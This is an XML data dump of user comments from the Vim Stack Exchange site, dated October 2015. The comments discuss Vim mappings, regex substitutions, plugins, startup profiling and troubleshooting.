  <row Id="8006" PostId="5239" Score="2" Text="in your example you seem to want to remove until the last occurence of `x`" CreationDate="2015-10-23T04:55:48.980" UserId="259" />
  <row Id="8007" PostId="5236" Score="0" Text="Would either answer accomplish anything?  Have you considered reporting this to vim_dev instead?" CreationDate="2015-10-23T06:01:56.117" UserId="2313" />
  <row Id="8008" PostId="5236" Score="0" Text="Well, my question is whether this scrollbar behavior is normal and not configurable or it's just some plugin has changed some settings. If I remember correctly until recently the scrollbar worked correctly." CreationDate="2015-10-23T06:13:41.217" UserId="1378" />
  <row Id="8009" PostId="5175" Score="0" Text="@ChristianBrabandt It sounds like there is enough power available here to let me write something to automatically fold these (mostly single empty or whitespace-only) lines around the braces. But I'll have to sit down and really ponder it, seems like." CreationDate="2015-10-23T06:34:29.330" UserId="390" />
  <row Id="8010" PostId="5241" Score="1" Text="That's a valid answer.  No need to put it in a comment.  We're only talking about one piece of software (with its variations), so you don't necessarily need to get fancy to have a valid answer-worthy answer." CreationDate="2015-10-23T07:17:39.387" UserId="4676" />
  <row Id="8011" PostId="5239" Score="0" Text="@guillem you're right. That was a copy-paste error. Anyhow, I tried to accomplish what I asked on the example with the error, but did not manage to do so. I asked another question: [delete from cursor till nth occurence of character x](http://vi.stackexchange.com/questions/5243/delete-from-cursor-till-nth-occurence-of-character-x)." CreationDate="2015-10-23T09:05:32.227" UserId="5011" />
  <row Id="8012" PostId="5241" Score="0" Text="Thanks this is what I will actually use! :)" CreationDate="2015-10-23T09:16:52.310" UserId="5011" />
  <row Id="8013" PostId="5236" Score="0" Text="To find out whether the problem is related to a plugin, disable all plugins and see if the problem persists.  If it doesn't (and thus the problem is likely to be related to a plugin), disable plugins in turn to find out the culprit.  The report it to plugin's author.  Otherwise, try to reproduce the problem with a minimal config and report it to vim_dev.  It isn't that hard, you know." CreationDate="2015-10-23T09:17:59.523" UserId="2313" />
  <row Id="8014" PostId="5241" Score="0" Text="I see. Thanks Wildcard." CreationDate="2015-10-23T11:11:00.563" UserId="947" />
  <row Id="8016" PostId="5241" Score="0" Text="@ErwinRooijakkers you should select this answer if this is what you'll now use." CreationDate="2015-10-23T16:03:03.083" UserId="5025" />
  <row Id="8017" PostId="5187" Score="0" Text="The [LargeFile](https://github.com/vim-scripts/LargeFile) plugin tries to automatically optimize Vim settings when opening large files." CreationDate="2015-10-23T17:02:20.063" UserId="599" />
  <row Id="8018" PostId="5241" Score="0" Text="@PaulEvans I don't agree. Although this answer has more practical value for me, I think that the accepted answer provides a better answer to the question asked (since it does exactly what is requested -- I did not ask to see the text highlighted first)." CreationDate="2015-10-23T19:40:23.793" UserId="5011" />
  <row Id="8019" PostId="5156" Score="0" Text="it will only expand when I type in the command: `h_`,  but it won't expand if type some other command which contain an h like: `xxxh_`, so it's perfect for my problem." CreationDate="2015-10-23T22:57:29.507" UserId="1276" />
  <row Id="8020" PostId="5251" Score="0" Text="It depends somewhat on how robust you want this indentation detection to be. A simple solution would be to assume that leading tabs exist in a file only if tabs are used for indentation. Then you could do something simple like `if search('^\t', 'wn') | setlocal noexpandtab | else | setlocal expandtab | endif`, where you could replace those `|`s by newlines in your plugin." CreationDate="2015-10-23T23:42:00.793" UserId="2055" />
  <row Id="8021" PostId="5232" Score="0" Text="@JJoao fun fact, I'm using gvim 7.4 on Windows 10." CreationDate="2015-10-24T03:47:55.120" UserId="3303" />
  <row Id="8022" PostId="5232" Score="0" Text="someone courageous enough to use vim (+1) in windows will surely benefit with install grep, fmt, awk, sort, " CreationDate="2015-10-24T09:06:27.333" UserId="3002" />
  <row Id="8023" PostId="5251" Score="6" Text="Tim Pope had the same problem, and came up with [a solution](https://github.com/tpope/vim-sleuth)." CreationDate="2015-10-24T09:32:03.293" UserId="2313" />
  <row Id="8024" PostId="5253" Score="0" Text="Nice! I wasn't sure how to find this in the help documents (`:h #` brings up info about the normal-mode object). I might sometimes need the complete filepath, which according to the help would be `:!pandoc #1:p #2:p #3:p -o out.pdf`." CreationDate="2015-10-24T22:43:30.993" UserId="514" />
  <row Id="8025" PostId="5254" Score="0" Text="Why do you have the same quickfix buffer open in multiple windows?  You can use loclists instead of quickfix lists if you need multiple windows." CreationDate="2015-10-25T08:47:26.933" UserId="2313" />
  <row Id="8026" PostId="5254" Score="0" Text="It it not my plugin exactly that loads results to a window, my plugin is related to the window control (open, close) and it happens that the quickfix window is open in different tabs, where I need an event that a window is closed." CreationDate="2015-10-25T11:01:09.667" UserId="5038" />
  <row Id="8027" PostId="5253" Score="2" Text="@evilsoup, a good trick to know is `Ctrl-D` when typing a help command.  It lists the possible completions.  Try typing `:h #` and then pressing `Ctrl-D`.  Also note that unlike shell autocompletion, this lists any help topic containing the typed substring—it doesn't have to be at the start of the help topic name." CreationDate="2015-10-25T13:39:09.610" UserId="4676" />
  <row Id="8028" PostId="5256" Score="0" Text="I have a Linux VM I can play with.  Can you comment with a link to the instructions you've been following?  Also, which Linux distribution are you using?" CreationDate="2015-10-25T13:42:10.343" UserId="4676" />
  <row Id="8029" PostId="5238" Score="0" Text="Not working for me? I get `E10: \ should be followed by /, ? or &amp;                                                                                                      24,1 60%`, but perhaps I am doing it wrong?" CreationDate="2015-10-25T14:55:10.903" UserId="5007" />
  <row Id="8030" PostId="5235" Score="0" Text="This is good! Can I somehow make it jump to the next error when I press n?" CreationDate="2015-10-25T14:56:02.983" UserId="5007" />
  <row Id="8031" PostId="5253" Score="0" Text="@Wildcard thanks for the tip, that'll come in handy I think." CreationDate="2015-10-25T15:22:23.023" UserId="514" />
  <row Id="8033" PostId="5259" Score="0" Text="works for me. Try using `vim -N -u NONE `" CreationDate="2015-10-25T16:10:10.667" UserId="71" />
  <row Id="8034" PostId="5256" Score="0" Text="Please use a newer vim. This looks like a bug and most likely this has been fixed" CreationDate="2015-10-25T16:11:04.307" UserId="71" />
  <row Id="8035" PostId="5257" Score="1" Text="I think you can also capitalise from visual mode with the mapping `gU`." CreationDate="2015-10-25T16:30:25.447" UserId="21" />
  <row Id="8036" PostId="5257" Score="0" Text="@KarlYngveLervåg I do not want to capitalise each character, merely the first one in each word." CreationDate="2015-10-25T16:32:02.350" UserId="1066" />
  <row Id="8037" PostId="5258" Score="0" Text="For me, it capitalises each word in the line my selection is on. So, everything inside the selection is processed, but also stuff before and after." CreationDate="2015-10-25T16:33:51.590" UserId="1066" />
  <row Id="8038" PostId="5259" Score="0" Text="@ChristianBrabandt Tried (`vim -N -u NONE *.txt`), but it seems it's still the same. Tested with Vim v7.3 (Linux) &amp; v7.4 (OS X)." CreationDate="2015-10-25T16:49:08.290" UserId="467" />
  <row Id="8039" PostId="5259" Score="0" Text="I think I know the problem, will post as an answer" CreationDate="2015-10-25T16:58:09.577" UserId="71" />
  <row Id="8040" PostId="5238" Score="0" Text="@KristianNordestgaard, in `.vimrc`we have to remove initial &quot;:&quot; . Please try `map \q  :%s/\v([}&quot;])(\s*\n\s*\S+\s*\=)/\1,\2/e&lt;CR&gt;&lt;CR&gt;`" CreationDate="2015-10-25T17:31:15.557" UserId="3002" />
  <row Id="8041" PostId="5256" Score="0" Text="@Wildcard Here's my Linux distribution (not sure how much info you need):lindsb@rrlogin:~$ lsb_release -a&#xA;LSB Version:    :core-3.1-amd64:core-3.1-noarch:graphics-3.1-amd64:graphics-3.1-noarchDistributor ID: ScientificSL&#xA;Description:    Scientific Linux SL release 5.5 (Boron)&#xA;Release:    5.5&#xA;Codename:   Boron&#xA;&#xA;lindsb@rrlogin:~$ cat /proc/version&#xA;Linux version 2.6.18-371.8.1.el5 (mockbuild@norob.fnal.gov) (gcc version 4.1.2 20080704 (Red Hat 4.1.2-54)) #1 SMP Thu Apr 24 14:03:58 CDT 2014" CreationDate="2015-10-25T17:55:08.833" UserId="5043" />
  <row Id="8042" PostId="5256" Score="0" Text="@ChristianBrabandt I don't have root access on this machine. I might consider a local installation of vim if that's not too difficult and there's no other way around it." CreationDate="2015-10-25T18:00:01.920" UserId="5043" />
  <row Id="8043" PostId="5258" Score="0" Text="Yes of course. What did you expect? Substitutions are line-wise by default. See my edit." CreationDate="2015-10-25T18:07:56.070" UserId="54" />
  <row Id="8044" PostId="5256" Score="0" Text="@ChristianBrabandt I installed the latest version of vim locally, and the bug is gone. However, the local version of vim takes about 1 second to open whereas the global installation opened practically instantaneously. Any idea why that is or how to get around that?" CreationDate="2015-10-25T18:38:41.783" UserId="5043" />
  <row Id="8045" PostId="5256" Score="0" Text="@user2680824 User `--startuptime` argument to profile startup of vim." CreationDate="2015-10-25T18:43:40.860" UserId="71" />
  <row Id="8046" PostId="5256" Score="0" Text="@ChristianBrabandt Cool functionality. Looks like &quot;setup clipboard&quot; is responsible for about 90% of that long startup time. My global vim doesn't appear to have the --statuptime option, so I can't compare the two. Is setup clipboard necessary, and if not, can I tel vim not to do it?" CreationDate="2015-10-25T18:55:17.087" UserId="5043" />
  <row Id="8047" PostId="5235" Score="0" Text="I've updated the answer to include what you asked for. See if it works for you." CreationDate="2015-10-25T19:38:34.373" UserId="599" />
  <row Id="8048" PostId="3302" Score="0" Text="@IngoKarkat Can you point to relevant help section for: `/{pattern}/[cmd]` syntax? Is it `:help :/`? But then I can't find explanation for `[cmd]`." CreationDate="2015-10-25T19:46:38.680" UserId="467" />
  <row Id="8049" PostId="5264" Score="0" Text="What is that &quot;cmd&quot; thing? Does it actually support 256 colors?" CreationDate="2015-10-25T20:26:56.383" UserId="54" />
  <row Id="8050" PostId="5232" Score="1" Text="@JJoao I think I have 3-12 copies of those tools &quot;installed&quot; variously throughout Windows. Github comes with Github's Git Shell that has embedded core utils (and it's own vim 7.4). Gnu on Windows installs a slightly more updated version of the tools. The Vim package installed some somewhere, and the Git installer installed them, and Vim 7.4 with python and perl bindings. The annoying thing so far seems to be the lack of a unified system, and gVim's confusion as to where they are. Trying to set a path doesn't always help. Oh and Visual Studio is some 20GB and includes them somewhere too." CreationDate="2015-10-25T20:58:24.580" UserId="3303" />
  <row Id="8051" PostId="5265" Score="0" Text="How about `g/foo/ .,/foo/d` (replacing foo with what works for you, of course)?" CreationDate="2015-10-25T21:05:38.767" UserId="2942" />
  <row Id="8052" PostId="5265" Score="0" Text="@PeterLewerin Yes, `:g/&lt;body/,/body&gt;/d` seems to work (as a side-effect, it'll remove the whole lines with it, but it almost works as expected). You can add that into your answer." CreationDate="2015-10-25T21:09:05.907" UserId="467" />
  <row Id="8053" PostId="3213" Score="0" Text="Similar: [Remove everything except regex match in Vim](http://stackoverflow.com/q/4503748/55075) at SO" CreationDate="2015-10-25T22:35:45.773" UserId="467" />
  <row Id="8054" PostId="5258" Score="0" Text="I did not realise that. Thanks for clearing that up." CreationDate="2015-10-25T23:10:43.553" UserId="1066" />
  <row Id="8055" PostId="5264" Score="0" Text="What is your terminal and what is the TERM variable set to?" CreationDate="2015-10-26T07:26:19.197" UserId="71" />
  <row Id="8056" PostId="5232" Score="0" Text="☹: There is a clear need of open-source repository for windows.  Does `:.,$!grep -oP '\w+'` works for you? (sometimes they call it ggrep or even gnugrep...)" CreationDate="2015-10-26T08:38:37.853" UserId="3002" />
  <row Id="8057" PostId="5269" Score="0" Text="Thank you, that worked. Now if only I could set the font size in the terminal to be language specific. :)" CreationDate="2015-10-26T14:21:44.097" UserId="5049" />
  <row Id="8058" PostId="5274" Score="0" Text="In .vimrc I have this: `set hlsearch` and `d?$&lt;Enter&gt;` does what I asked but it also highlights all the line endings in the file so I have to type `:noh` after that to remove the highlight. Is there a way to avoid this? Thank you! `:-)`" CreationDate="2015-10-26T16:30:21.707" UserId="5010" />
  <row Id="8059" PostId="5274" Score="1" Text="There probably is, what I do is simply &quot;overload&quot; `&lt;C-l&gt;` in  normal mode: `nnoremap &lt;silent&gt;&lt;C-l&gt; :nohlsearch&lt;cr&gt;:set nolist&lt;cr&gt;:redraw!&lt;cr&gt;`, then use it when needed (i.e. in cases such as the above)." CreationDate="2015-10-26T16:34:06.657" UserId="1800" />
  <row Id="8060" PostId="5276" Score="0" Text="[How to `locate` multiple files and open them in vim?](http://unix.stackexchange.com/q/45782)" CreationDate="2015-10-03T21:44:08.520" UserDisplayName="glts" />
  <row Id="8061" PostId="5276" Score="0" Text="@gits not a duplicate question because I would like to use the `find` command and return multiple files" CreationDate="2015-10-03T22:03:08.027" UserId="4761" />
  <row Id="8062" PostId="5277" Score="2" Text="`vim -p \`find . -name '*.txt'\``" CreationDate="2015-10-08T14:41:50.420" UserId="2710" />
  <row Id="8063" PostId="5277" Score="0" Text="I like that more.  If you post it as an answer I'll accept it." CreationDate="2015-10-08T14:59:06.770" UserId="4761" />
  <row Id="8064" PostId="5277" Score="0" Text="Ok, will do that." CreationDate="2015-10-08T15:10:52.853" UserId="2710" />
  <row Id="8065" PostId="5275" Score="0" Text="And at this point I wonder what I did wrong, because I am sure I tried just that. Well, gotta check the command history on the office system tomorrow. :-D Cheers, and thanks!" CreationDate="2015-10-26T17:47:07.587" UserId="1726" />
  <row Id="8066" PostId="5250" Score="0" Text="I've tried this suggestion (and several variations) but it's not working.  However, it may be due to my lack of experience...  In any event, I'm getting the default vim-latex `` and '' SmartQuotes.  I've tried looking only for csquotes in the search string as well as setting the global instead of the buffer values (g:Tex_SmartQuoteOpen).  Is there some way that vim-latex is running something after tex.vim that's overriding these?  Sadly, I'm not familiar at all with the behind-the-scenes magic that vim-latex uses when loading a file..." CreationDate="2015-10-26T19:58:12.330" UserId="4999" />
  <row Id="8067" PostId="5250" Score="0" Text="I should point out that I know the tex.vim file is being used/parsed, as I have to redefine the mapping of Tex_InsertItemOnThisLine in this file in order to use e-acute and that works just fine." CreationDate="2015-10-26T20:03:57.357" UserId="4999" />
  <row Id="8068" PostId="5279" Score="2" Text="Have you considered investing a few minutes in reading the manual?" CreationDate="2015-10-26T20:20:14.583" UserId="1577" />
  <row Id="8069" PostId="5250" Score="0" Text="Running `grep -R Tex_Smart_QuoteOpen` from the shell shows that variable being set only in the `german` and `ngerman` packages. I don't know how that might affect you. I tested that code before posting it and it worked for me. There might be an error in the call to `search()`. Try executing `:echo search('\\usepackage.\{-}{csquotes}', 'wn')` from the Vim command line while the current window contains a file that uses that package. The number echoed should be the line number of the `usepackage` statement. Make sure you enclose the pattern in single-quotes (`'`), not double-quotes (`&quot;`)." CreationDate="2015-10-26T20:36:29.870" UserId="2055" />
  <row Id="8070" PostId="5250" Score="0" Text="It's not the package, but the vim-latex plugin that uses these variables.  Currently, I manually set these in my .vimrc file (except, of course, when testing the solution above) and it works correctly.  Using echo, I got the correct line number but get the default `` '' quotes..." CreationDate="2015-10-26T20:57:19.440" UserId="4999" />
  <row Id="8071" PostId="5250" Score="0" Text="What I meant by those being set in packages was these results from running `grep -R Tex_SmartQuoteOpen` in my `~/.vim` directory: `vim-latex/ftplugin/latex-suite/packages/german:let b:Tex_SmartQuoteOpen = '&quot;`'` and `vim-latex/ftplugin/latex-suite/packages/ngerman:let b:Tex_SmartQuoteOpen = '&quot;`'`." CreationDate="2015-10-26T22:04:16.050" UserId="2055" />
  <row Id="8072" PostId="5272" Score="3" Text="Not an answer, but: why not just use `G` and `gg`?" CreationDate="2015-10-26T22:08:55.490" UserId="21" />
  <row Id="8073" PostId="5250" Score="0" Text="It's still working fine for me. I don't know what else to suggest other than debugging your setup, and that can be tedious. I'm sorry I couldn't be of more help." CreationDate="2015-10-26T22:34:29.560" UserId="2055" />
  <row Id="8074" PostId="5281" Score="0" Text="With cursor on `m`, maybe `hvk$d` ? (to avoid selecting  it)" CreationDate="2015-10-26T23:08:32.177" UserId="1800" />
  <row Id="8075" PostId="5271" Score="1" Text="If this is something you do frequently, you should consider writing your own mapping for it, maybe something like `&lt;Leader&gt;dk`." CreationDate="2015-10-26T23:31:32.953" UserId="1060" />
  <row Id="8076" PostId="5282" Score="2" Text="This is the only answer so far that (1) doesn't alter the search history or change the current highlighting and (2) doesn't delete the `m`." CreationDate="2015-10-26T23:32:24.857" UserId="1060" />
  <row Id="8077" PostId="5265" Score="1" Text="How about a replace by nothing  `:%s/&lt;body&gt;\(.|\n\)*&lt;\/body&gt;//` ?" CreationDate="2015-10-27T00:04:08.223" UserId="3002" />
  <row Id="8078" PostId="5279" Score="0" Text="Do you think on the syntax highlighting?" CreationDate="2015-10-27T04:49:28.483" UserId="28" />
  <row Id="8079" PostId="5281" Score="1" Text="Ah, yes. Updating now." CreationDate="2015-10-27T06:57:24.717" UserId="21" />
  <row Id="8080" PostId="5286" Score="1" Text="You can already shorten `:Commentary` to `:Co` like so `:17,21Co`." CreationDate="2015-10-27T11:11:15.333" UserId="54" />
  <row Id="8081" PostId="5286" Score="0" Text="How can I do that @romainl?" CreationDate="2015-10-27T11:25:48.740" UserId="5019" />
  <row Id="8082" PostId="5286" Score="1" Text="`:17,21call NERDComment('n', 'Toggle')`" CreationDate="2015-10-27T11:26:13.123" UserId="2313" />
  <row Id="8083" PostId="5286" Score="0" Text="Only If I wanted to type down this big command @SatoKatsura" CreationDate="2015-10-27T11:27:03.443" UserId="5019" />
  <row Id="8084" PostId="5286" Score="0" Text="Which is why you'd write a `command` for it.  The function does the heavy lifting for you." CreationDate="2015-10-27T11:28:28.397" UserId="2313" />
  <row Id="8085" PostId="5286" Score="0" Text="Please guide how that would be done" CreationDate="2015-10-27T11:30:46.863" UserId="5019" />
  <row Id="8086" PostId="5286" Score="2" Text="`command! -range Co &lt;line1&gt;,&lt;line2&gt;call NERDComment('n', 'Toggle')`" CreationDate="2015-10-27T12:08:07.647" UserId="2313" />
  <row Id="8087" PostId="1941" Score="1" Text="Actually, you can use a pair of line numbers, a pair of patterns, or mixed pair for `&lt;start&gt;` and `&lt;end&gt;` for this. For reference, see `:h [range]`. So it's actually quite a bit more flexible than you made it out to be." CreationDate="2015-10-27T12:21:39.360" UserId="5072" />
  <row Id="8088" PostId="5286" Score="1" Text="By just typing `:17,21Co&lt;CR&gt;`." CreationDate="2015-10-27T12:40:46.090" UserId="54" />
  <row Id="8089" PostId="5242" Score="1" Text="Unfortunately, this didn't do anything. I wonder if it's because I'm on windows and not using bash." CreationDate="2015-10-27T16:36:10.707" UserId="2920" />
  <row Id="8090" PostId="5250" Score="0" Text="I appreciate your help.  From what I understand about .vimrc and tex.vim your solution should work for me too - I'm clearly missing something about my specific configuration.  I'll keep digging." CreationDate="2015-10-27T17:51:32.700" UserId="4999" />
  <row Id="8091" PostId="5286" Score="2" Text="Most of these comments should really be answers...short answers are okay, so let's show the world (and Area 51) how good our &quot;answers ratio&quot; and &quot;time to first answer&quot; really are!  :)" CreationDate="2015-10-27T18:54:40.370" UserId="4676" />
  <row Id="8092" PostId="5286" Score="0" Text="I would still like some to improve this function to make uncommenting code as well in it" CreationDate="2015-10-27T19:24:12.320" UserId="5019" />
  <row Id="8093" PostId="5286" Score="0" Text="And nerd commentor has a lot of flaws. It doesn't comment blank lines and what not" CreationDate="2015-10-27T19:28:21.247" UserId="5019" />
  <row Id="8094" PostId="5280" Score="0" Text="Thanks; so, perhaps I'm still not conversant in vim. If I try and get help on `gqip` I get no results. Help on `gq` does mention it's an internal formatter possibly falling back on external `fmt` or the configured equivalent in some cases. Help on `ip` says its the inner paragraph range, apparently meaning from the previous blank line to the next. I'm guessing this applies `gq` to that. I suppose I was missing familiarity with *text object selections* (section 6 of *cursor motions*) in `cusors.txt`. I'm supposing the definition of a paragraph can change depending on the current syntax in use?" CreationDate="2015-10-27T23:21:02.497" UserId="3303" />
  <row Id="8095" PostId="5288" Score="0" Text="Hi there @jamessan. thanks for your solution. It worked ...and I learned something new about this very important tool we use ( Vim )." CreationDate="2015-10-28T07:17:34.933" UserId="5066" />
  <row Id="8096" PostId="5290" Score="6" Text="Next time, just use `:shell` to spawn a new shell." CreationDate="2015-10-28T08:07:53.900" UserId="205" />
  <row Id="8097" PostId="5290" Score="0" Text="@muru, that's good to know—is the problem I had common?  (If you can expand on that as an answer, it's probably better than mine—how to avoid the situation rather than recover from the crash!)  :)" CreationDate="2015-10-28T10:07:13.490" UserId="4676" />
  <row Id="8098" PostId="5290" Score="2" Text="Well, that depends on what you call the problem here. Vim not returning to the foreground - never seen that before. People using ctrl-z to get the shell - *very* common." CreationDate="2015-10-28T10:08:43.957" UserId="205" />
  <row Id="8099" PostId="5293" Score="1" Text="How about pasting on the commandline? I.e. yank your object (`yi}`), and then press `/&lt;Ctrl-r&gt;=&lt;Enter&gt;` to search for it." CreationDate="2015-10-28T10:12:15.290" UserId="1296" />
  <row Id="8100" PostId="5290" Score="0" Text="I think I've seen this happening when the connection to X was lost." CreationDate="2015-10-28T10:50:41.097" UserId="599" />
  <row Id="8101" PostId="5232" Score="0" Text="@dlamblin Looks like you've already figured out the general answer for how to apply an ex range to a normal command. I think the reason it's not working for this specific instance is that the range is calculated *before* any of the normal commands are carried out. So when it gets to the line that was *originally* the last line in the file, it stops. (`gqG` looks like the quickest answer for this, as @JJoao suggested.)" CreationDate="2015-10-28T12:04:32.763" UserId="343" />
  <row Id="8102" PostId="5294" Score="0" Text="I am reluctant to install plugins, but it is a good start." CreationDate="2015-10-28T12:12:38.607" UserId="1937" />
  <row Id="8103" PostId="5280" Score="0" Text="@dlamblin see `:help paragraph` for the precise definition of a paragraph." CreationDate="2015-10-28T12:12:42.757" UserId="343" />
  <row Id="8105" PostId="5293" Score="0" Text="From reading http://stackoverflow.com/a/3997110/946226 I would expect `&quot;/yi}` to do something along these lines, but unfortunately, it cannot be used with `y` and `p`, although I wonder why." CreationDate="2015-10-28T12:20:44.293" UserId="1937" />
  <row Id="8107" PostId="5265" Score="0" Text="@JJoao Yes, it works (`:%s/&lt;body\_.\{-}body&gt;//`). Can you post the answer then?" CreationDate="2015-10-28T13:45:00.017" UserId="467" />
  <row Id="8110" PostId="5294" Score="0" Text="@JoachimBreitner Then you're missing the [useful implementations](https://github.com/kana/vim-textobj-user/wiki) of objects.  But `visual-star-search` has 17 lines, you can copy the relevant parts to your config." CreationDate="2015-10-28T15:13:47.967" UserId="2313" />
  <row Id="8112" PostId="5275" Score="4" Text="I think using `-es` is more performant, I have noticed a small &quot;blink&quot; without it as Vim started up and quit." CreationDate="2015-10-28T16:16:56.200" UserId="205" />
  <row Id="8115" PostId="5294" Score="0" Text="Copying to the config is even worse. I, as far as possible, try to make use of plain vim in order to be able to use other computers without hassle. But that’s getting OT :-)" CreationDate="2015-10-28T19:12:53.047" UserId="1937" />
  <row Id="8116" PostId="5294" Score="0" Text="Then re-type the commands to the config.  The plugin consist of ~5 &quot;plain Vim&quot; commands.  It isn't like there are 216 _other_ ways of doing it, you know. :) Also, the advantage of installing the ~5 commands via a plugin is that somebody else is taking care of collecting bug reports, and fixing bugs." CreationDate="2015-10-28T19:21:40.957" UserId="2313" />
  <row Id="8118" PostId="5293" Score="0" Text="@PhilippFrank, it seems your suggestion is the best (if one wants a solution that works without scripting/plugins); would you mind turning it into an answer?" CreationDate="2015-10-28T19:53:07.903" UserId="1937" />
  <row Id="8119" PostId="5299" Score="0" Text="Did you try anything? E.g. `nnoremap &lt;leader&gt;h &lt;c-]&gt;`" CreationDate="2015-10-28T20:13:34.133" UserId="1800" />
  <row Id="8120" PostId="5299" Score="1" Text="I use the following mapping: `nnoremap &lt;buffer&gt; &lt;cr&gt; &lt;c-]&gt;` in `~/.vim/after/ftplugin/help.vim`." CreationDate="2015-10-28T21:25:50.187" UserId="778" />
  <row Id="8121" PostId="5301" Score="0" Text="What is the feature to uncomment a line then?" CreationDate="2015-10-29T05:27:12.803" UserId="5019" />
  <row Id="8122" PostId="5300" Score="0" Text="This does not provide an answer to the question. To critique or request clarification from an author, leave a comment below their post - you can always comment on your own posts, and once you have sufficient [reputation](http://vi.stackexchange.com/help/whats-reputation) you will be able to [comment on any post](http://vi.stackexchange.com/help/privileges/comment)." CreationDate="2015-10-29T10:49:43.433" UserId="467" />
  <row Id="8123" PostId="5293" Score="0" Text="Not at all. I'll also fix the register name :)" CreationDate="2015-10-29T11:31:28.577" UserId="1296" />
  <row Id="8124" PostId="5222" Score="0" Text="I’m wondering if this could be because of Vim’s theme. Some terminal emulators have a setting to draw brighter colors with bold." CreationDate="2015-10-29T11:38:35.257" UserId="4922" />
  <row Id="8125" PostId="5300" Score="0" Text="It does work but I'd prefer not having to use the mouse." CreationDate="2015-10-29T12:38:26.617" UserId="5081" />
  <row Id="8126" PostId="5299" Score="0" Text="I've placed the mappings in my ~/.vimrc file and it still doesn't work" CreationDate="2015-10-29T12:42:13.660" UserId="5081" />
  <row Id="8127" PostId="5303" Score="0" Text="I think this should have a `[^\n]*` inserted after the `bla`, since OP said &quot;begins with&quot; bla, not &quot;only contains&quot; bla." CreationDate="2015-10-29T12:50:27.453" UserId="4676" />
  <row Id="8128" PostId="5303" Score="0" Text="@Wildcard Thanks, probably I misunderstood 2. step, I've expanded my answer based on your advice. Hope that's clearer now." CreationDate="2015-10-29T13:00:16.140" UserId="467" />
  <row Id="8129" PostId="5303" Score="0" Text="Yep.  I like this approach because it doesn't require the regex be typed in twice." CreationDate="2015-10-29T13:03:32.560" UserId="4676" />
  <row Id="8130" PostId="5306" Score="0" Text="It works for me. Thanks" CreationDate="2015-10-29T13:09:26.227" UserId="5081" />
  <row Id="8131" PostId="5273" Score="0" Text="You can also use `+` instead of `-c`, like `+%s/e//g`, see: [How to edit files non-interactively (e.g. in pipeline)?](http://vi.stackexchange.com/q/788/467)" CreationDate="2015-10-29T13:12:32.273" UserId="467" />
  <row Id="8132" PostId="5285" Score="1" Text="For this specific command, it's worth noting that Karl's answer to your other question—`hvk$d`—is also undoable with a single `u`." CreationDate="2015-10-29T13:13:05.840" UserId="4676" />
  <row Id="8133" PostId="5304" Score="0" Text="Quite nice, although it probably breaks down if the selected text contains special regex characters." CreationDate="2015-10-29T13:20:34.417" UserId="1937" />
  <row Id="8134" PostId="5304" Score="0" Text="True. You might get quite a long way by using \V (`:h \V`, the very-nomagic switch) before pressing &lt;C-r&gt; though." CreationDate="2015-10-29T13:55:07.557" UserId="1296" />
  <row Id="8135" PostId="5305" Score="1" Text="How are views configured in your vimrc? The way it is described it appears to be set to automatically create these view files, as opposed to invoking `:mkview` manually? If possible I would like to reproduce what you're experiencing in order to look for an answer." CreationDate="2015-10-29T13:57:50.687" UserId="5070" />
  <row Id="8137" PostId="5305" Score="0" Text="You're right, I completely forgot, I had those 2 lines inside my vimrc :&#xA;&#xA;    `au BufWinLeave ?* mkview` and &#xA;    `au BufWinEnter ?* silent loadview`&#xA;&#xA;I suppose it was to automatically save and restore folds." CreationDate="2015-10-29T14:15:04.353" UserId="4939" />
  <row Id="8138" PostId="5305" Score="1" Text="I had my suspicions, glad to hear my hint was of any use! I posted an answer as well, so this question can be marked as solved if you consider it so." CreationDate="2015-10-29T14:36:27.213" UserId="5070" />
  <row Id="8139" PostId="5305" Score="0" Text="I marked the question as solved. Thank you very much for taking the time to help me." CreationDate="2015-10-29T14:44:22.947" UserId="4939" />
  <row Id="8140" PostId="5305" Score="0" Text="No problem! Thank you." CreationDate="2015-10-29T14:47:56.957" UserId="5070" />
  <row Id="8141" PostId="5299" Score="1" Text="Maybe CTRL-Shift-]?" CreationDate="2015-10-29T16:52:34.313" UserId="4620" />
  <row Id="8142" PostId="5299" Score="0" Text="It works fine. Thanks, I can jump now from tag to tag easily. @blm" CreationDate="2015-10-29T17:39:02.167" UserId="5081" />
  <row Id="8147" PostId="5301" Score="0" Text="The same command, it acts as a toggle like you want." CreationDate="2015-10-30T00:59:58.410" UserId="4932" />
  <row Id="8149" PostId="5309" Score="3" Text="See `:help getcmdpos()` and the topics referred to there." CreationDate="2015-10-30T01:30:31.067" UserId="2055" />
  <row Id="8150" PostId="2344" Score="0" Text="Yes, I've even used `^R` for macros.  It has let me perform super tricky manipulations of text by yanking part of the file during the macro, and later, also during the macro, using the yanked part in a long Ex-mode command with `^R`.  :)" CreationDate="2015-10-30T02:39:13.993" UserId="4676" />
  <row Id="8151" PostId="2835" Score="0" Text="Having the exact same problem." CreationDate="2015-10-30T04:01:18.697" UserId="5106" />
  <row Id="8152" PostId="2439" Score="0" Text="But I have never once used this feature. I do `15k d5j 10j P`." CreationDate="2015-10-30T09:24:17.650" UserId="630" />
  <row Id="8153" PostId="5309" Score="2" Text="Thanks, this help.  I have ended up with the mapping `cnoremap &lt;expr&gt; &lt;C-d&gt; (getcmdpos()==len(getcmdline())+1?'&lt;C-d&gt;':'&lt;Del&gt;')`." CreationDate="2015-10-30T09:52:05.447" UserId="1248" />
  <row Id="8154" PostId="5299" Score="0" Text="It's a personal choice, but I chose to adopt an EN QWERTY layout for coding, as some keys like \, [, ] etc. are easier to reach. (I'm French)." CreationDate="2015-10-30T10:26:03.987" UserId="2716" />
  <row Id="8155" PostId="5299" Score="0" Text="That's definitely true but I'm using a laptop and I prefer using its keyboard ( I know I can change the keyboard language easily but It's quite confusing) @JoshRomRock" CreationDate="2015-10-30T10:36:09.820" UserId="5081" />
  <row Id="8156" PostId="5314" Score="0" Text="This looks pretty much what I was thinking of! So `d/\d` uses a forward search to the next digit character as the motion? http://vimregex.com/#metacharacters" CreationDate="2015-10-30T10:43:56.243" UserId="180" />
  <row Id="8157" PostId="5314" Score="1" Text="Yup, that is correct!" CreationDate="2015-10-30T10:54:57.650" UserId="5070" />
  <row Id="8158" PostId="5315" Score="1" Text="You could always get one of the commenter plugins (or define the commands yourself, easy for a specific language) and then define your keemapping as &quot;uncomment, then move, then comment&quot;. Or, better yet &quot;toggle comment, move, toggle comment&quot; so the same binding works for non-commented lines as well." CreationDate="2015-10-30T11:19:59.033" UserId="1296" />
  <row Id="8159" PostId="5315" Score="0" Text="I think, when commenting out text, the initial indent is taken into account (which looks like the correct way to comment out). So uncomment-indent-comment will probably not work." CreationDate="2015-10-30T11:23:05.093" UserId="1248" />
